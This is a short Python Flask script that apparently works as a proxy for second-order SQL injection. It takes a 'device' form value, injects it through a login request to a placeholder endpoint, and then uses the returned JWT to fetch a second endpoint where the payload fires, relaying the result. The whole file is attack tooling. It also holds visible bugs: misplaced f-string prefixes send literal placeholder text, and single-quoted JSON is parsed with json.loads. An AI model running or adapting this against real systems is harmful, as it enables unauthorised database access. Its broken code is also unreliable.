#!/bin/python3
import requests
import json
from flask import Flask, redirect, url_for, request
app = Flask(__name__)

CLIENT_ID = "YOUR_CLIENT_ID"
CLIENT_SECRET = "YOUR_CLIENT_SECRET"
header_auth = {f"clientid": "{CLIENT_ID}","clientsecret": "{CLIENT_SECRET}", "granttype": "password","Content-Type":"application/json"}
header_exec = {f"clientid": "{CLIENT_ID}","clientsecret": "{CLIENT_SECRET}", "authorization": "" }

USERNAME = "YOUR_USERNAME"
PASSWORD = "YOUR_PASSWORD"
URL_INJECT = "YOUR_URL_TO_INJECT"
URL_GET = "YOUR_URL_TO_GET"

def prep_injection(device):
    data_raw = "{" + f"'username':'{USERNAME}','password':'{PASSWORD}','device':'{device}'" + "}"
    data_json = json.loads(data_raw)
    r = requests.post(URL_INJECT ,json = data_json,headers=header_auth)
    return json.loads(r.text)["access_token"] 

def send_SQLI(token):
    header_exec["authorization"]="JWT %s"%(token)
    r = requests.get(URL_GET,headers=header_exec)
    return r.text


@app.route('/login',methods = ['POST'])
def login():
    if request.method == 'POST':
        device = request.form.get('device')
        return send_SQLI(prep_injection(device))


if __name__ == '__main__':
   app.run(debug = True)